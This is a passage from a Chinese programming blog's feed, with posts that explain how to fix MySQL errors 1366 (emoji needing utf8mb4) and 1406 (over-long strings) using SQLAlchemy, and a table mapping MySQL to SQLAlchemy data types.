class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">USERNAME = <span class="string">'xxx'</span></span><br><span class="line">PASSWORD = <span class="string">'xxx'</span></span><br><span class="line">DB = <span class="string">'xxx'</span></span><br><span class="line"><span class="comment"># f代表可以使用&#123;&#125;引用变量</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建引擎</span></span><br><span class="line">engine = create_engine(DB_URI)</span><br><span class="line"><span class="comment"># 创建SQLORM基类，注意这里要加参数，参数为上一步创建的引擎</span></span><br><span class="line">Base = declarative_base(engine)</span><br><span class="line"><span class="comment"># 构建session对象</span></span><br><span class="line">session = sessionmaker(engine)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实体表Encode</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encode</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">"string_encode"</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    property = Column(TEXT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模型映射到数据库中</span></span><br><span class="line"><span class="comment"># 即如果数据库中没有student表则创建映射表student</span></span><br><span class="line">Base.metadata.create_all()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增：一个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(obj)</span>:</span></span><br><span class="line">    session.add(obj)  <span class="comment"># 添加到session</span></span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除Encode表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_table</span><span class="params">()</span>:</span></span><br><span class="line">    Encode.__table__.drop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    property = <span class="string">"📦 🚀 森罗万象"</span></span><br><span class="line">    insert(Encode(property=property))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># del_table()</span></span><br></pre></td></tr></table></figure><p>出现报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlalchemy.exc.DataError: (pymysql.err.DataError) (1366, <span class="string">"Incorrect string value: '\\xF0\\x9F\\x93\\xA6 \\xF0...' for column 'property' at row 1"</span>)</span><br><span class="line">[SQL: INSERT INTO string_encode (property) VALUES (%(property)s)]</span><br><span class="line">[parameters: &#123;<span class="string">'property'</span>: <span class="string">'📦 🚀 森罗万象'</span>&#125;]</span><br><span class="line">(Background on this error at: https://sqlalche.me/e/14/9h9h)</span><br></pre></td></tr></table></figure><h2 id="22-尝试解决"><a class="markdownIt-Anchor" href="#22-尝试解决"></a> 2.2 尝试解决</h2><h3 id="221-sqlalchemy-设置表编码及引擎"><a class="markdownIt-Anchor" href="#221-sqlalchemy-设置表编码及引擎"></a> 2.2.1 Sqlalchemy 设置表编码及引擎</h3><p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_34015336/article/details/93760632" target="_blank" rel="noopener">Sqlalchemy 设置表编码及引擎</a></p><ol><li><p>设置引擎编码方式为utf8：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>?charset=utf8'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认是utf8，所以上述代码无需修改</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br></pre></td></tr></table></figure></li><li><p>设置数据库表编码方式为utf8mb4：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encode</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">"string_encode"</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    property = Column(TEXT)</span><br><span class="line">    __table_args__ = &#123;</span><br><span class="line">        <span class="string">"mysql_charset"</span>: <span class="string">"utf8mb4"</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>删除原来的表，再次生成表结构就可以正常插入了：</p><img src="https://s2.loli.net/2022/03/26/TlzLxG3yScio7EY.png" width="800" height="200" alt="图片名称" align="center" id="119"></li></ol><p><strong>缺点</strong>：需要重新构建表，所以旧表存在大量数据就会比较麻烦；在这种情况下可以使用下面的方法。</p><h3 id="222-修改表的字符集为utf8mb4"><a class="markdownIt-Anchor" href="#222-修改表的字符集为utf8mb4"></a> 2.2.2 修改表的字符集为utf8mb4</h3><p><strong>参考</strong>：<a href="https://blog.csdn.net/qlzy_5418/article/details/91973353" target="_blank" rel="noopener">mysql之（1366，“Incorrect string value:’\xF0\x9F\x98\x82…’ for column ‘content’ at row 1”)20</a></p><ol><li><p>navicat右击需要修改的数据表，点击设计表；</p></li><li><p>选择要修改的字段<code>property</code>，将字符集修改为<code>utf8mb4</code>，然后保存：</p><img src="https://s2.loli.net/2022/03/26/Ne1f5wn8GOLZqxt.png" width="800" height="300" alt="图片名称" align="center" id="120"></li><li><p>现在就可以正常插入了：</p><img src="https://s2.loli.net/2022/03/26/8pfV65gsinLQFMS.png" width="800" height="300" alt="图片名称" align="center" id="121"></li></ol><p><strong>缺点</strong>：这种方法仅仅改变了当前表的字符集，如果以后项目迁移，重新生成表的情况，相同的问题将会再次出现。</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/zz975896590/article/details/119991096" target="_blank" rel="noopener">Mysql错误1366的解决办法：Incorrect string value: ‘\xF0\x9F…’ for column ‘XXX’ at row 1</a></li><li><a href="https://blog.csdn.net/wenxingchen/article/details/118021258" target="_blank" rel="noopener">pymysql.err.DataError: (1366, “Incorrect string value: ‘\xF0\x9F\x92\xA1 \xE4…‘ for column ‘d</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL-错误1406：超长字符串</title>
      <link href="/2022/03/25/MySQL-%E9%94%99%E8%AF%AF1406%EF%BC%9A%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2022/03/25/MySQL-%E9%94%99%E8%AF%AF1406%EF%BC%9A%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>在做毕设时，操作mysql时出现了这样的一个报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlalchemy.exc.DataError: (pymysql.err.DataError) (1406, <span class="string">"Data too long for column 'actions' at row 1"</span>)</span><br></pre></td></tr></table></figure><p>这里显示字段的长度不够存放数据，也就是解决mysql超长字符串存储问题。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-问题复现"><a class="markdownIt-Anchor" href="#21-问题复现"></a> 2.1 问题复现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">USERNAME = <span class="string">'xxx'</span></span><br><span class="line">PASSWORD = <span class="string">'xxx'</span></span><br><span class="line">DB = <span class="string">'xxx'</span></span><br><span class="line"><span class="comment"># f代表可以使用&#123;&#125;引用变量</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建引擎</span></span><br><span class="line">engine = create_engine(DB_URI)</span><br><span class="line"><span class="comment"># 创建SQLORM基类，注意这里要加参数，参数为上一步创建的引擎</span></span><br><span class="line">Base = declarative_base(engine)</span><br><span class="line"><span class="comment"># 构建session对象</span></span><br><span class="line">session = sessionmaker(engine)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实体表Length</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Length</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">"string_length"</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    actions = Column(String(<span class="number">10</span>))  <span class="comment"># 修改此处debug</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模型映射到数据库中</span></span><br><span class="line"><span class="comment"># 即如果数据库中没有student表则创建映射表student</span></span><br><span class="line">Base.metadata.create_all()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增：一个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(obj)</span>:</span></span><br><span class="line">    session.add(obj)  <span class="comment"># 添加到session</span></span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除Data表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_table</span><span class="params">()</span>:</span></span><br><span class="line">    Length.__table__.drop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    actions = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):  <span class="comment"># 修改长度进行测试</span></span><br><span class="line">        actions += <span class="string">"SY"</span></span><br><span class="line">    insert(Length(actions=actions))</span><br><span class="line">    del_table()</span><br></pre></td></tr></table></figure><p>出现报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlalchemy.exc.DataError: (pymysql.err.DataError) (1406, <span class="string">"Data too long for column 'actions' at row 1"</span>)</span><br><span class="line">[SQL: INSERT INTO string_length (actions) VALUES (%(actions)s)]</span><br><span class="line">[parameters: &#123;<span class="string">'actions'</span>: <span class="string">'SYSYSYSYSYSYSYSYSYSY'</span>&#125;]</span><br><span class="line">(Background on this error at: https://sqlalche.me/e/14/9h9h)</span><br></pre></td></tr></table></figure><h2 id="22-尝试解决"><a class="markdownIt-Anchor" href="#22-尝试解决"></a> 2.2 尝试解决</h2><ol><li><p>修改String的长度参数，可以解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actions = Column(String(<span class="number">21842</span>))</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：VARCHAR(0-65535 bytes)，这里测试String的长度参数最大是<code>21842</code>，具体意思与大小还不清楚。</p></li><li><p>修改长度后就发生了之前的报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">actions = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21842</span>):</span><br><span class="line">    actions += <span class="string">"SY"</span></span><br><span class="line">insert(Length(actions=actions))</span><br></pre></td></tr></table></figure><p>修改字段类型为<code>TEXT</code>可以解决上述问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actions = Column(TEXT)  <span class="comment"># 64K TEXT</span></span><br><span class="line">actions = Column(TEXT(<span class="number">65536</span>))  <span class="comment"># 16M MEDIUMTEXT</span></span><br><span class="line">actions = Column(TEXT(<span class="number">16777216</span>))  <span class="comment"># 32M LONGTEXT</span></span><br></pre></td></tr></table></figure><p>现在字符串最大长度可以到32M，可以cover大部分情况。</p></li></ol><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/Darkman_EX/article/details/85211597" target="_blank" rel="noopener">mysql报错：“DataError: (pymysql.err.DataError) (1406, &quot;Data too long for column ‘pwd’ at row 1”</a></li><li><a href="https://blog.csdn.net/qq_41251963/article/details/86659549" target="_blank" rel="noopener">pymysql.err.DataError: (1406, “Data too long for column ‘字段名’ at row 1”)</a></li><li><a href="https://blog.csdn.net/qq392039757/article/details/83617260" target="_blank" rel="noopener">pymysql.err.DataError: (1406, “Data too long for column ‘url’ at row 1”)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL-数据类型以及sqlalchemy中的对应</title>
      <link href="/2022/03/25/MySQL-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8Asqlalchemy%E4%B8%AD%E7%9A%84%E5%AF%B9%E5%BA%94/"/>
      <url>/2022/03/25/MySQL-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8Asqlalchemy%E4%B8%AD%E7%9A%84%E5%AF%B9%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-mysql数据类型"><a class="markdownIt-Anchor" href="#1-mysql数据类型"></a> 1 MySQL数据类型</h1><ul><li><strong>参考</strong>：<a href="https://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">MySQL 数据类型</a></li></ul><p>MySQL 支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。</p><h2 id="11-数值类型"><a class="markdownIt-Anchor" href="#11-数值类型"></a> 1.1 数值类型</h2><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">大小</th><th style="text-align:center">范围（有符号）</th><th style="text-align:center">范围（无符号）</th><th style="text-align:center">用途</th></tr></thead><tbody><tr><td style="text-align:center">TINYINT</td><td style="text-align:center">1 Bytes</td><td style="text-align:center">(-128，127)</td><td style="text-align:center">(0，255)</td><td style="text-align:center">小整数值</td></tr><tr><td style="text-align:center">SMALLINT</td><td style="text-align:center">2 Bytes</td><td style="text-align:center">(-32768，32767)</td><td style="text-align:center">(0，65 535)</td><td style="text-align:center">大整数值</td></tr><tr><td style="text-align:center">MEDIUMINT</td><td style="text-align:center">3 Bytes</td><td style="text-align:center">(-8388608，8388607)</td><td style="text-align:center">(0，16 777 215)</td><td style="text-align:center">大整数值</td></tr><tr><td style="text-align:center">INT或INTEGER</td><td style="text-align:center">4 Bytes</td><td style="text-align:center">(-2 147 483 648，2 147 483 647)</td><td style="text-align:center">(0，4 294 967 295)</td><td style="text-align:center">大整数值</td></tr><tr><td style="text-align:center">BIGINT</td><td style="text-align:center">8 Bytes</td><td style="text-align:center">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td style="text-align:center">(0，18 446 744 073 709 551 615)</td><td style="text-align:center">极大整数值</td></tr><tr><td style="text-align:center">FLOAT</td><td style="text-align:center">4 Bytes</td><td style="text-align:center">-</td><td style="text-align:center">-</td><td style="text-align:center">单精度浮点数值</td></tr><tr><td style="text-align:center">DOUBLE</td><td style="text-align:center">8 Bytes</td><td style="text-align:center">-</td><td style="text-align:center">-</td><td style="text-align:center">双精度浮点数值</td></tr><tr><td style="text-align:center">DECIMAL或DEC</td><td style="text-align:center">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td style="text-align:center">依赖于M和D的值</td><td style="text-align:center">依赖于M和D的值</td><td style="text-align:center">小数值</td></tr></tbody></table><h2 id="12-日期和时间类型"><a class="markdownIt-Anchor" href="#12-日期和时间类型"></a> 1.2 日期和时间类型</h2><p>每个时间类型有一个有效值范围和一个&quot;零&quot;值，当指定不合法的MySQL不能表示的值时使用&quot;零&quot;值。</p><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">大小 ( bytes)</th><th style="text-align:center">范围</th><th style="text-align:center">格式</th><th style="text-align:center">用途</th></tr></thead><tbody><tr><td style="text-align:center">DATE</td><td style="text-align:center">3</td><td style="text-align:center">1000-01-01/9999-12-31</td><td style="text-align:center">YYYY-MM-DD</td><td style="text-align:center">日期值</td></tr><tr><td style="text-align:center">TIME</td><td style="text-align:center">3</td><td style="text-align:center">‘-838:59:59’/‘838:59:59’</td><td style="text-align:center">HH:MM:SS</td><td style="text-align:center">时间值或持续时间</td></tr><tr><td style="text-align:center">YEAR</td><td style="text-align:center">1</td><td style="text-align:center">1901/2155</td><td style="text-align:center">YYYY</td><td style="text-align:center">年份值</td></tr><tr><td style="text-align:center">DATETIME</td><td style="text-align:center">8</td><td style="text-align:center">1000-01-01 00:00:00/9999-12-31 23:59:59</td><td style="text-align:center">YYYY-MM-DD HH:MM:SS</td><td style="text-align:center">混合日期和时间值</td></tr><tr><td style="text-align:center">TIMESTAMP</td><td style="text-align:center">4</td><td style="text-align:center">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td style="text-align:center">YYYYMMDD HHMMSS</td><td style="text-align:center">混合日期和时间值，时间戳</td></tr></tbody></table><h2 id="13-字符串类型"><a class="markdownIt-Anchor" href="#13-字符串类型"></a> 1.3 字符串类型</h2><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">大小</th><th style="text-align:center">用途</th></tr></thead><tbody><tr><td style="text-align:center">CHAR</td><td style="text-align:center">0-255 bytes</td><td style="text-align:center">定长字符串</td></tr><tr><td style="text-align:center">VARCHAR</td><td style="text-align:center">0-65535 bytes</td><td style="text-align:center">变长字符串</td></tr><tr><td style="text-align:center">TINYBLOB</td><td style="text-align:center">0-255 bytes</td><td style="text-align:center">不超过 255 个字符的二进制字符串</td></tr><tr><td style="text-align:center">TINYTEXT</td><td style="text-align:center">0-255 bytes</td><td style="text-align:center">短文本字符串</td></tr><tr><td style="text-align:center">BLOB</td><td style="text-align:center">0-65 535 bytes</td><td style="text-align:center">二进制形式的长文本数据</td></tr><tr><td style="text-align:center">TEXT</td><td style="text-align:center">0-65 535 bytes</td><td style="text-align:center">长文本数据</td></tr><tr><td style="text-align:center">MEDIUMBLOB</td><td style="text-align:center">0-16 777 215 bytes</td><td style="text-align:center">二进制形式的中等长度文本数据</td></tr><tr><td style="text-align:center">MEDIUMTEXT</td><td style="text-align:center">0-16 777 215 bytes</td><td style="text-align:center">中等长度文本数据</td></tr><tr><td style="text-align:center">LONGBLOB</td><td style="text-align:center">0-4 294 967 295 bytes</td><td style="text-align:center">二进制形式的极大文本数据</td></tr><tr><td style="text-align:center">LONGTEXT</td><td style="text-align:center">0-4 294 967 295 bytes</td><td style="text-align:center">极大文本数据</td></tr></tbody></table><ul><li>char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</li><li>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</li><li>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</li><li>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</li><li>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</li></ul><h1 id="2-mysql-sqlalchemy与python数据类型对应"><a class="markdownIt-Anchor" href="#2-mysql-sqlalchemy与python数据类型对应"></a> 2 MySQL、sqlalchemy与Python数据类型对应</h1><table><thead><tr><th style="text-align:center">Mysql类型</th><th style="text-align:center">sqlalchemy类型</th><th style="text-align:center">python类型</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">TINYINT(1B)</td><td style="text-align:center">Boolean</td><td style="text-align:center">bool</td><td style="text-align:center">布尔值</td></tr><tr><td style="text-align:center">SMALLINT(2B)</td><td style="text-align:center">SmallInteger</td><td style="text-align:center">int</td><td style="text-align:center">取值范围较小，一般为16位</td></tr><tr><td style="text-align:center">MEDIUMINT(3B)</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">INT或INTEGER(4B)</td><td style="text-align:center">Integer</td><td style="text-align:center">int</td><td style="text-align:center">普通整数，一般32位</td></tr><tr><td style="text-align:center">BIGINT(8B)</td><td style="text-align:center">BigInteger</td><td style="text-align:center">int/long</td><td style="text-align:center">不限精度的整数</td></tr><tr><td style="text-align:center">FLOAT(4B)</td><td style="text-align:center">Float</td><td style="text-align:center">float</td><td style="text-align:center">浮点数</td></tr><tr><td style="text-align:center">DOUBLE(8B)</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">DECIMAL或DEC</td><td style="text-align:center">Numeric</td><td style="text-align:center">decimal.Decimal</td><td style="text-align:center">定点数</td></tr><tr><td style="text-align:center">DATE(3B)</td><td style="text-align:center">Date</td><td style="text-align:center">datetime.date</td><td style="text-align:center">日期</td></tr><tr><td style="text-align:center">TIME(3B)</td><td style="text-align:center">Time</td><td style="text-align:center">date.time</td><td style="text-align:center">时间</td></tr><tr><td style="text-align:center">YEAR(1B)</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">DATETIME(8B)</td><td style="text-align:center">DateTime</td><td style="text-align:center">datetime.datetime</td><td style="text-align:center">日期和时间</td></tr><tr><td style="text-align:center">TIMESTAMP(4B)</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">CHAR</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">VARCHAR</td><td style="text-align:center">String</td><td style="text-align:center">str</td><td style="text-align:center">变长字符串，而且String后面需要长度参数，否则报错</td></tr><tr><td style="text-align:center">TINYBLOB</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">TINYTEXT</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">BLOB</td><td style="text-align:center">LargeBinary</td><td style="text-align:center">str</td><td style="text-align:center">二进制文件，64K=65535bytes</td></tr><tr><td style="text-align:center">TEXT</td><td style="text-align:center">Text</td><td style="text-align:center">str</td><td style="text-align:center">变长字符串，64K=65535bytes(255bytes)</td></tr><tr><td style="text-align:center">MEDIUMBLOB</td><td style="text-align:center">LargeBinary(65536)</td><td style="text-align:center">str</td><td style="text-align:center">二进制，16M=16777215bytes</td></tr><tr><td style="text-align:center">MEDIUMTEXT</td><td style="text-align:center">Text(65536)</td><td style="text-align:center">str</td><td style="text-align:center">变长字符串，16M=16777215bytes</td></tr><tr><td style="text-align:center">LONGBLOB</td><td style="text-align:center">LargeBinary(16777216)</td><td style="text-align:center">str</td><td style="text-align:center">二进制，32M=4294967295bytes</td></tr><tr><td style="text-align:center">LONGTEXT</td><td style="text-align:center">Text(16777216)</td><td style="text-align:center">str</td><td style="text-align:center">变长字符串，32M=4294967295bytes</td></tr><tr><td style="text-align:center">ENUM</td><td style="text-align:center">Enum</td><td style="text-align:center">str</td><td style="text-align:center">一组字符串</td></tr></tbody></table><h1 id="3-代码实战"><a class="markdownIt-Anchor" href="#3-代码实战"></a> 3 代码实战</h1><h2 id="31-建立mysql表"><a class="markdownIt-Anchor" href="#31-建立mysql表"></a> 3.1 建立MySQL表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">USERNAME = <span class="string">'xxx'</span>  <span class="comment"># mysql的用户名</span></span><br><span class="line">PASSWORD = <span class="string">'xxx'</span>  <span class="comment"># mysql的密码</span></span><br><span class="line">DB = <span class="string">'xxx'</span>  <span class="comment"># 数据库名称</span></span><br><span class="line"><span class="comment"># 